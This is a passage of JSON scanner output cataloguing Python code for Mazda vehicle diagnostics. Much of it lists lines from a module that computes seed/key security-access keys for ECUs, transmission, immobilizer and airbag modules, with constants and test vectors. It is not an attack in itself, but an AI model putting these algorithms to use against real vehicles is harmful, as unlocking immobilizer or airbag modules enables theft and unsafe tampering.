"self.vehicle_state['current_gear'] = data[0] & 0x0F"}, {"type": "hardware", "line": 327, "hardware": "vehicle", "content": "self.vehicle_state['target_gear'] = (data[0] >> 4) & 0x0F"}, {"type": "hardware", "line": 328, "hardware": "vehicle", "content": "self.vehicle_state['clutch_switch'] = bool(data[1] & 0x01)"}, {"type": "hardware", "line": 329, "hardware": "vehicle", "content": "self.vehicle_state['brake_switch'] = bool(data[1] & 0x02)"}, {"type": "hardware", "line": 330, "hardware": "vehicle", "content": "self.vehicle_state['cruise_control'] = bool(data[1] & 0x04)"}, {"type": "hardware", "line": 334, "hardware": "vehicle", "content": "self.vehicle_state['gear'] = gear_map.get(self.vehicle_state['current_gear'], '?')"}, {"type": "hardware", "line": 342, "hardware": "vehicle", "content": "self.vehicle_state['dsc_active'] = bool(data[0] & 0x01)"}, {"type": "hardware", "line": 343, "hardware": "vehicle", "content": "self.vehicle_state['traction_control_active'] = bool(data[0] & 0x02)"}, {"type": "hardware", "line": 347, "hardware": "vehicle", "content": "def get_vehicle_state(self) -> dict:"}, {"type": "hardware", "line": 348, "hardware": "vehicle", "content": "\"\"\"Get the current vehicle state.\"\"\""}, {"type": "hardware", "line": 350, "hardware": "vehicle", "content": "return self.vehicle_state.copy()"}, {"type": "hardware", "line": 356, "hardware": "vehicle", "content": "'rpm': self.vehicle_state['rpm'],"}, {"type": "hardware", "line": 357, "hardware": "vehicle", "content": "'throttle': self.vehicle_state['throttle'],"}, {"type": "hardware", "line": 358, "hardware": "vehicle", "content": "'boost': self.vehicle_state['boost'],"}, {"type": "hardware", "line": 359, "hardware": "vehicle", "content": "'coolant_temp': self.vehicle_state['coolant_temp'],"}, {"type": "hardware", "line": 360, "hardware": "vehicle", "content": "'intake_temp': self.vehicle_state['intake_temp'],"}, {"type": "hardware", "line": 361, "hardware": "vehicle", "content": "'maf': self.vehicle_state['maf'],"}, {"type": "hardware", "line": 362, "hardware": "vehicle", "content": "'afr': self.vehicle_state['afr'],"}, {"type": "hardware", "line": 363, "hardware": "vehicle", "content": "'ignition_timing': self.vehicle_state['ignition_timing'],"}, {"type": "hardware", "line": 364, "hardware": "vehicle", "content": "'knock_retard': self.vehicle_state['knock_retard'],"}, {"type": "hardware", "line": 365, "hardware": "vehicle", "content": "'knock_count': self.vehicle_state['knock_count'],"}, {"type": "hardware", "line": 366, "hardware": "vehicle", "content": "'ethanol_percent': self.vehicle_state['ethanol_percent'],"}, {"type": "hardware", "line": 367, "hardware": "vehicle", "content": "'battery_voltage': self.vehicle_state['battery_voltage']"}, {"type": "hardware", "line": 374, "hardware": "vehicle", "content": "'gear': self.vehicle_state['gear'],"}, {"type": "hardware", "line": 375, "hardware": "vehicle", "content": "'current_gear': self.vehicle_state['current_gear'],"}, {"type": "hardware", "line": 376, "hardware": "vehicle", "content": "'target_gear': self.vehicle_state['target_gear'],"}, {"type": "hardware", "line": 377, "hardware": "vehicle", "content": "'clutch_switch': self.vehicle_state['clutch_switch'],"}, {"type": "hardware", "line": 378, "hardware": "vehicle", "content": "'brake_switch': self.vehicle_state['brake_switch']"}, {"type": "hardware", "line": 385, "hardware": "vehicle", "content": "'dsc_active': self.vehicle_state['dsc_active'],"}, {"type": "hardware", "line": 386, "hardware": "vehicle", "content": "'traction_control_active': self.vehicle_state['traction_control_active'],"}, {"type": "hardware", "line": 387, "hardware": "vehicle", "content": "'cruise_control': self.vehicle_state['cruise_control'],"}, {"type": "hardware", "line": 388, "hardware": "vehicle", "content": "'check_engine_light': self.vehicle_state['check_engine_light']"}, {"type": "hardware", "line": 462, "hardware": "vehicle", "content": "print(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 464, "hardware": "vehicle", "content": "print(\"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 472, "hardware": "CAN bus", "content": "print(\"Starting CAN bus monitoring...\")"}, {"type": "hardware", "line": 476, "hardware": "vehicle", "content": "print(\"Monitoring vehicle data (press Ctrl+C to stop)...\")"}, {"type": "hardware", "line": 479, "hardware": "vehicle", "content": "state = mazda.get_vehicle_state()"}, {"type": "hardware", "line": 494, "hardware": "vehicle", "content": "print(\"Disconnected from vehicle\")"}], "security_logic": [{"type": "security_pattern", "line": 486, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "MazdaSecurityCore.py", "lines_read": 305, "features_found": [{"type": "function", "name": "run_self_tests", "line": 263}, {"type": "function", "name": "__init__", "line": 64}, {"type": "function", "name": "compute_key", "line": 67}, {"type": "function", "name": "_compute_m12r_v34", "line": 91}, {"type": "function", "name": "_compute_tcm_xor", "line": 125}, {"type": "function", "name": "_compute_immobilizer_3des", "line": 143}, {"type": "function", "name": "_compute_srs_enhanced", "line": 170}, {"type": "function", "name": "verify_key", "line": 208}, {"type": "function", "name": "set_session_key", "line": 222}, {"type": "function", "name": "get_session_key", "line": 232}, {"type": "function", "name": "clear_session_keys", "line": 244}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "Crypto.Cipher", "line": null}, {"type": "import", "module": "Crypto.Util.Padding", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "Tuple,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "DES3", "line": null}, {"type": "import", "module": "pad,", "line": null}], "components_found": [{"type": "class", "name": "SecurityAlgorithm", "line": 17}, {"type": "class", "name": "SecurityLevel", "line": 24}, {"type": "class", "name": "SecurityCredentials", "line": 32}, {"type": "class", "name": "MazdaSecurityCore", "line": 42}], "algorithms": [], "protocols": [{"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_0 = 0x00  # No security"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_1 = 0x01  # Basic security (e.g., session seed/key)"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_2 = 0x02  # Enhanced security (e.g., flash programming)"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_3 = 0x03  # Highest security (e.g., immobilizer)"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF,"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "0x5A, 0x3C, 0x96, 0xE1, 0x2F, 0x8D, 0x47, 0xB0,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "0x6E, 0x29, 0x1A, 0x5F, 0x84, 0xC7, 0xD2, 0x3B"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "seed ^= 0x1DA650D"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "seed = (seed << 1) & 0xFFFFFFFF"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "seed ^= 0x1DA650D"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "seed = (seed << 1) & 0xFFFFFFFF"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key & 0xFFFF0000) >> 16) | ((key & 0xFFFF) << 16)"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "key ^= 0x5A5A5A5A"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key & 0xFF00FF00) >> 8) | ((key & 0x00FF00FF) << 8)"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "key ^= 0xA5A5A5A5"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "return struct.pack(\">I\", key & 0xFFFFFFFF)"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "key = seed ^ 0x5A5A5A5A"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key & 0xFFFF) << 16) | ((key >> 16) & 0xFFFF)"}, {"type": "protocol", "line": 139, "protocol": "0x[0-9A-Fa-f]+", "content": "key ^= 0xA5A5A5A5"}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "return struct.pack(\">I\", key & 0xFFFFFFFF)"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "key = seed ^ 0x5A5A5A5A"}, {"type": "protocol", "line": 191, "protocol": "0x[0-9A-Fa-f]+", "content": "key = (key + ecu_int) & 0xFFFFFFFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key >> 16) | (key << 16)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 195, "protocol": "0x[0-9A-Fa-f]+", "content": "key ^= 0xFFFFFFFF"}, {"type": "protocol", "line": 199, "protocol": "0x[0-9A-Fa-f]+", "content": "key = (key + srs_const) & 0xFFFFFFFF"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key & 0x00FF00FF) << 8) | ((key & 0xFF00FF00) >> 8)"}, {"type": "protocol", "line": 204, "protocol": "0x[0-9A-Fa-f]+", "content": "key ^= 0x5A5A5A5A"}, {"type": "protocol", "line": 252, "protocol": "0x[0-9A-Fa-f]+", "content": "(bytes([0x12, 0x34, 0x56, 0x78]), SecurityLevel.LEVEL_1, bytes([0x5D, 0x4A, 0x3E, 0x1F])),"}, {"type": "protocol", "line": 253, "protocol": "0x[0-9A-Fa-f]+", "content": "(bytes([0x00, 0x00, 0x00, 0x00]), SecurityLevel.LEVEL_1, bytes([0x00, 0x00, 0x00, 0x00])),"}, {"type": "protocol", "line": 254, "protocol": "0x[0-9A-Fa-f]+", "content": "(bytes([0xFF, 0xFF, 0xFF, 0xFF]), SecurityLevel.LEVEL_1, bytes([0x5A, 0x5A, 0x5A, 0x5A])),"}, {"type": "protocol", "line": 257, "protocol": "0x[0-9A-Fa-f]+", "content": "(bytes([0x12, 0x34, 0x56, 0x78]), SecurityLevel.LEVEL_0, bytes([0xE2, 0x8E, 0x0C, 0xE2])),"}, {"type": "protocol", "line": 258, "protocol": "0x[0-9A-Fa-f]+", "content": "(bytes([0x00, 0x00, 0x00, 0x00]), SecurityLevel.LEVEL_0, bytes([0xFF, 0xFF, 0xFF, 0xFF])),"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "MazdaSecurityCore - Implements security algorithms for Mazda vehicles."}, {"type": "hardware", "line": 2, "hardware": "vehicle", "content": "MazdaSecurityCore - Implements security algorithms for Mazda vehicles."}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "This module provides a unified interface for various Mazda security algorithms"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "including M12R v3.4, TCM XOR, Immobilizer 3DES, and SRS enhanced security."}, {"type": "hardware", "line": 5, "hardware": "TCM", "content": "including M12R v3.4, TCM XOR, Immobilizer 3DES, and SRS enhanced security."}, {"type": "hardware", "line": 5, "hardware": "SRS", "content": "including M12R v3.4, TCM XOR, Immobilizer 3DES, and SRS enhanced security."}, {"type": "hardware", "line": 5, "hardware": "immobilizer", "content": "including M12R v3.4, TCM XOR, Immobilizer 3DES, and SRS enhanced security."}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "class SecurityAlgorithm(Enum):"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "\"\"\"Supported security algorithms.\"\"\""}, {"type": "hardware", "line": 20, "hardware": "TCM", "content": "TCM_XOR = \"TCM_XOR\""}, {"type": "hardware", "line": 21, "hardware": "immobilizer", "content": "IMMOBILIZER_3DES = \"IMMOBILIZER_3DES\""}, {"type": "hardware", "line": 22, "hardware": "SRS", "content": "SRS_ENHANCED = \"SRS_ENHANCED\""}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "class SecurityLevel(IntEnum):"}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "\"\"\"Security access levels.\"\"\""}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "LEVEL_0 = 0x00  # No security"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "LEVEL_1 = 0x01  # Basic security (e.g., session seed/key)"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "LEVEL_2 = 0x02  # Enhanced security (e.g., flash programming)"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "LEVEL_3 = 0x03  # Highest security (e.g., immobilizer)"}, {"type": "hardware", "line": 29, "hardware": "immobilizer", "content": "LEVEL_3 = 0x03  # Highest security (e.g., immobilizer)"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "class SecurityCredentials:"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "\"\"\"Container for security credentials and parameters.\"\"\""}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "algorithm: SecurityAlgorithm"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "level: SecurityLevel = SecurityLevel.LEVEL_0"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "ecu_serial: Optional[bytes] = None"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "class MazdaSecurityCore:"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "Core security implementation for Mazda vehicles."}, {"type": "hardware", "line": 44, "hardware": "vehicle", "content": "Core security implementation for Mazda vehicles."}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "Implements various security algorithms used in Mazda ECUs including:"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "- M12R v3.4: Used in many Mazda ECUs for seed/key authentication"}, {"type": "hardware", "line": 48, "hardware": "TCM", "content": "- TCM XOR: Simple XOR-based algorithm used in some transmission modules"}, {"type": "hardware", "line": 49, "hardware": "immobilizer", "content": "- Immobilizer 3DES: 3DES-based algorithm used in immobilizer systems"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "- SRS Enhanced: Enhanced security for SRS (airbag) modules"}, {"type": "hardware", "line": 50, "hardware": "SRS", "content": "- SRS Enhanced: Enhanced security for SRS (airbag) modules"}, {"type": "hardware", "line": 59, "hardware": "SRS", "content": "SRS_ENHANCED_CONST = bytes(["}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "self._session_keys: Dict[SecurityLevel, bytes] = {}"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "def compute_key(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "Compute a security key using the specified algorithm and credentials."}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "credentials: SecurityCredentials object with algorithm and parameters"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "if credentials.algorithm == SecurityAlgorithm.M12R_V3_4:"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "elif credentials.algorithm == SecurityAlgorithm.TCM_XOR:"}, {"type": "hardware", "line": 82, "hardware": "TCM", "content": "elif credentials.algorithm == SecurityAlgorithm.TCM_XOR:"}, {"type": "hardware", "line": 83, "hardware": "TCM", "content": "return self._compute_tcm_xor(credentials)"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "elif credentials.algorithm == SecurityAlgorithm.IMMOBILIZER_3DES:"}, {"type": "hardware", "line": 84, "hardware": "immobilizer", "content": "elif credentials.algorithm == SecurityAlgorithm.IMMOBILIZER_3DES:"}, {"type": "hardware", "line": 85, "hardware": "immobilizer", "content": "return self._compute_immobilizer_3des(credentials)"}, {"type": "hardware", "line": 86, "hardware": "ECU", "content": "elif credentials.algorithm == SecurityAlgorithm.SRS_ENHANCED:"}, {"type": "hardware", "line": 86, "hardware": "SRS", "content": "elif credentials.algorithm == SecurityAlgorithm.SRS_ENHANCED:"}, {"type": "hardware", "line": 87, "hardware": "SRS", "content": "return self._compute_srs_enhanced(credentials)"}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "raise ValueError(f\"Unsupported security algorithm: {credentials.algorithm}\")"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "def _compute_m12r_v34(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "Compute M12R v3.4 security key."}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "This is a custom algorithm used in many Mazda ECUs."}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "if credentials.level == SecurityLevel.LEVEL_1:"}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "elif credentials.level >= SecurityLevel.LEVEL_2:"}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "def _compute_tcm_xor(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 125, "hardware": "TCM", "content": "def _compute_tcm_xor(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "Compute TCM XOR security key."}, {"type": "hardware", "line": 127, "hardware": "TCM", "content": "Compute TCM XOR security key."}, {"type": "hardware", "line": 132, "hardware": "TCM", "content": "raise ValueError(\"TCM XOR requires a 4-byte seed\")"}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "def _compute_immobilizer_3des(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 143, "hardware": "immobilizer", "content": "def _compute_immobilizer_3des(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "Compute Immobilizer 3DES security key."}, {"type": "hardware", "line": 145, "hardware": "immobilizer", "content": "Compute Immobilizer 3DES security key."}, {"type": "hardware", "line": 147, "hardware": "vehicle", "content": "Uses 3DES encryption with a vehicle-specific key."}, {"type": "hardware", "line": 150, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer 3DES requires an 8-byte seed\")"}, {"type": "hardware", "line": 153, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer 3DES requires a 16-byte key\")"}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "def _compute_srs_enhanced(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 170, "hardware": "SRS", "content": "def _compute_srs_enhanced(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "hardware", "line": 172, "hardware": "ECU", "content": "Compute SRS enhanced security key."}, {"type": "hardware", "line": 172, "hardware": "SRS", "content": "Compute SRS enhanced security key."}, {"type": "hardware", "line": 174, "hardware": "SRS", "content": "More complex algorithm used in SRS (airbag) modules."}, {"type": "hardware", "line": 177, "hardware": "SRS", "content": "raise ValueError(\"SRS enhanced requires a 4-byte seed\")"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "if not credentials.ecu_serial or len(credentials.ecu_serial) < 8:"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "raise ValueError(\"SRS enhanced requires an ECU serial number\")"}, {"type": "hardware", "line": 180, "hardware": "SRS", "content": "raise ValueError(\"SRS enhanced requires an ECU serial number\")"}, {"type": "hardware", "line": 183, "hardware": "ECU", "content": "ecu_key = credentials.ecu_serial[:8]"}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "ecu_int = int.from_bytes(ecu_key, 'big')"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "key = (key + ecu_int) & 0xFFFFFFFF"}, {"type": "hardware", "line": 198, "hardware": "SRS", "content": "srs_const = int.from_bytes(self.SRS_ENHANCED_CONST[:4], 'big')"}, {"type": "hardware", "line": 199, "hardware": "SRS", "content": "key = (key + srs_const) & 0xFFFFFFFF"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "if credentials.level >= SecurityLevel.LEVEL_2:"}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "def verify_key(self, credentials: SecurityCredentials, expected_key: bytes) -> bool:"}, {"type": "hardware", "line": 213, "hardware": "ECU", "content": "credentials: SecurityCredentials with algorithm and parameters"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "def set_session_key(self, level: SecurityLevel, key: bytes) -> None:"}, {"type": "hardware", "line": 224, "hardware": "ECU", "content": "Store a session key for the specified security level."}, {"type": "hardware", "line": 227, "hardware": "ECU", "content": "level: Security level for this key"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "def get_session_key(self, level: SecurityLevel) -> Optional[bytes]:"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "level: Security level of the key to retrieve"}, {"type": "hardware", "line": 250, "hardware": "ECU", "content": "SecurityAlgorithm.M12R_V3_4: ["}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "(bytes([0x12, 0x34, 0x56, 0x78]), SecurityLevel.LEVEL_1, bytes([0x5D, 0x4A, 0x3E, 0x1F])),"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "(bytes([0x00, 0x00, 0x00, 0x00]), SecurityLevel.LEVEL_1, bytes([0x00, 0x00, 0x00, 0x00])),"}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "(bytes([0xFF, 0xFF, 0xFF, 0xFF]), SecurityLevel.LEVEL_1, bytes([0x5A, 0x5A, 0x5A, 0x5A])),"}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "SecurityAlgorithm.TCM_XOR: ["}, {"type": "hardware", "line": 256, "hardware": "TCM", "content": "SecurityAlgorithm.TCM_XOR: ["}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "(bytes([0x12, 0x34, 0x56, 0x78]), SecurityLevel.LEVEL_0, bytes([0xE2, 0x8E, 0x0C, 0xE2])),"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "(bytes([0x00, 0x00, 0x00, 0x00]), SecurityLevel.LEVEL_0, bytes([0xFF, 0xFF, 0xFF, 0xFF])),"}, {"type": "hardware", "line": 265, "hardware": "ECU", "content": "security = MazdaSecurityCore()"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.M12R_V3_4]):"}, {"type": "hardware", "line": 270, "hardware": "ECU", "content": "creds = SecurityCredentials("}, {"type": "hardware", "line": 271, "hardware": "ECU", "content": "algorithm=SecurityAlgorithm.M12R_V3_4,"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "result = security.compute_key(creds)"}, {"type": "hardware", "line": 280, "hardware": "ECU", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.TCM_XOR]):"}, {"type": "hardware", "line": 280, "hardware": "TCM", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.TCM_XOR]):"}, {"type": "hardware", "line": 281, "hardware": "ECU", "content": "creds = SecurityCredentials("}, {"type": "hardware", "line": 282, "hardware": "ECU", "content": "algorithm=SecurityAlgorithm.TCM_XOR,"}, {"type": "hardware", "line": 282, "hardware": "TCM", "content": "algorithm=SecurityAlgorithm.TCM_XOR,"}, {"type": "hardware", "line": 286, "hardware": "ECU", "content": "result = security.compute_key(creds)"}, {"type": "hardware", "line": 287, "hardware": "TCM", "content": "test_name = f\"TCM_XOR_test_{i+1}\""}], "security_logic": [{"type": "security_pattern", "line": 2, "pattern": "algorithm", "content": "MazdaSecurityCore - Implements security algorithms for Mazda vehicles."}, {"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "This module provides a unified interface for various Mazda security algorithms"}, {"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 14, "pattern": "cipher", "content": "from Crypto.Cipher import DES3"}, {"type": "security_pattern", "line": 17, "pattern": "algorithm", "content": "class SecurityAlgorithm(Enum):"}, {"type": "security_pattern", "line": 18, "pattern": "algorithm", "content": "\"\"\"Supported security algorithms.\"\"\""}, {"type": "security_pattern", "line": 27, "pattern": "key", "content": "LEVEL_1 = 0x01  # Basic security (e.g., session seed/key)"}, {"type": "security_pattern", "line": 27, "pattern": "seed", "content": "LEVEL_1 = 0x01  # Basic security (e.g., session seed/key)"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "algorithm: SecurityAlgorithm"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "seed: Optional[bytes] = None"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "key: Optional[bytes] = None"}, {"type": "security_pattern", "line": 46, "pattern": "algorithm", "content": "Implements various security algorithms used in Mazda ECUs including:"}, {"type": "security_pattern", "line": 47, "pattern": "key", "content": "- M12R v3.4: Used in many Mazda ECUs for seed/key authentication"}, {"type": "security_pattern", "line": 47, "pattern": "seed", "content": "- M12R v3.4: Used in many Mazda ECUs for seed/key authentication"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "- TCM XOR: Simple XOR-based algorithm used in some transmission modules"}, {"type": "security_pattern", "line": 49, "pattern": "algorithm", "content": "- Immobilizer 3DES: 3DES-based algorithm used in immobilizer systems"}, {"type": "security_pattern", "line": 65, "pattern": "key", "content": "self._session_keys: Dict[SecurityLevel, bytes] = {}"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "def compute_key(self, credentials: SecurityCredentials) -> bytes:"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "Compute a security key using the specified algorithm and credentials."}, {"type": "security_pattern", "line": 69, "pattern": "algorithm", "content": "Compute a security key using the specified algorithm and credentials."}, {"type": "security_pattern", "line": 72, "pattern": "algorithm", "content": "credentials: SecurityCredentials object with algorithm and parameters"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "bytes: Computed key"}, {"type": "security_pattern", "line": 80, "pattern": "algorithm", "content": "if credentials.algorithm == SecurityAlgorithm.M12R_V3_4:"}, {"type": "security_pattern", "line": 82, "pattern": "algorithm", "content": "elif credentials.algorithm == SecurityAlgorithm.TCM_XOR:"}, {"type": "security_pattern", "line": 84, "pattern": "algorithm", "content": "elif credentials.algorithm == SecurityAlgorithm.IMMOBILIZER_3DES:"}, {"type": "security_pattern", "line": 86, "pattern": "algorithm", "content": "elif credentials.algorithm == SecurityAlgorithm.SRS_ENHANCED:"}, {"type": "security_pattern", "line": 89, "pattern": "algorithm", "content": "raise ValueError(f\"Unsupported security algorithm: {credentials.algorithm}\")"}, {"type": "security_pattern", "line": 93, "pattern": "key", "content": "Compute M12R v3.4 security key."}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "This is a custom algorithm used in many Mazda ECUs."}, {"type": "security_pattern", "line": 97, "pattern": "seed", "content": "if not credentials.seed or len(credentials.seed) != 4:"}, {"type": "security_pattern", "line": 98, "pattern": "seed", "content": "raise ValueError(\"M12R v3.4 requires a 4-byte seed\")"}, {"type": "security_pattern", "line": 100, "pattern": "seed", "content": "seed = struct.unpack(\">I\", credentials.seed)[0]"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "key = 0"}, {"type": "security_pattern", "line": 105, "pattern": "seed", "content": "if (seed >> 31) & 1:"}, {"type": "security_pattern", "line": 106, "pattern": "seed", "content": "seed ^= 0x1DA650D"}, {"type": "security_pattern", "line": 107, "pattern": "seed", "content": "seed = (seed << 1) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 109, "pattern": "seed", "content": "if (seed >> 31) & 1:"}, {"type": "security_pattern", "line": 110, "pattern": "seed", "content": "seed ^= 0x1DA650D"}, {"type": "security_pattern", "line": 111, "pattern": "seed", "content": "seed = (seed << 1) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 113, "pattern": "key", "content": "key = (key << 1) | ((seed >> 31) & 1)"}, {"type": "security_pattern", "line": 113, "pattern": "seed", "content": "key = (key << 1) | ((seed >> 31) & 1)"}, {"type": "security_pattern", "line": 117, "pattern": "key", "content": "key = ((key & 0xFFFF0000) >> 16) | ((key & 0xFFFF) << 16)"}, {"type": "security_pattern", "line": 118, "pattern": "key", "content": "key ^= 0x5A5A5A5A"}, {"type": "security_pattern", "line": 120, "pattern": "key", "content": "key = ((key & 0xFF00FF00) >> 8) | ((key & 0x00FF00FF) << 8)"}, {"type": "security_pattern", "line": 121, "pattern": "key", "content": "key ^= 0xA5A5A5A5"}, {"type": "security_pattern", "line": 123, "pattern": "key", "content": "return struct.pack(\">I\", key & 0xFFFFFFFF)"}, {"type": "security_pattern", "line": 127, "pattern": "key", "content": "Compute TCM XOR security key."}, {"type": "security_pattern", "line": 129, "pattern": "algorithm", "content": "Simple XOR-based algorithm used in some transmission control modules."}, {"type": "security_pattern", "line": 131, "pattern": "seed", "content": "if not credentials.seed or len(credentials.seed) != 4:"}, {"type": "security_pattern", "line": 132, "pattern": "seed", "content": "raise ValueError(\"TCM XOR requires a 4-byte seed\")"}, {"type": "security_pattern", "line": 134, "pattern": "seed", "content": "seed = struct.unpack(\">I\", credentials.seed)[0]"}, {"type": "security_pattern", "line": 137, "pattern": "key", "content": "key = seed ^ 0x5A5A5A5A"}, {"type": "security_pattern", "line": 137, "pattern": "seed", "content": "key = seed ^ 0x5A5A5A5A"}, {"type": "security_pattern", "line": 138, "pattern": "key", "content": "key = ((key & 0xFFFF) << 16) | ((key >> 16) & 0xFFFF)"}, {"type": "security_pattern", "line": 139, "pattern": "key", "content": "key ^= 0xA5A5A5A5"}, {"type": "security_pattern", "line": 141, "pattern": "key", "content": "return struct.pack(\">I\", key & 0xFFFFFFFF)"}, {"type": "security_pattern", "line": 145, "pattern": "key", "content": "Compute Immobilizer 3DES security key."}, {"type": "security_pattern", "line": 147, "pattern": "key", "content": "Uses 3DES encryption with a 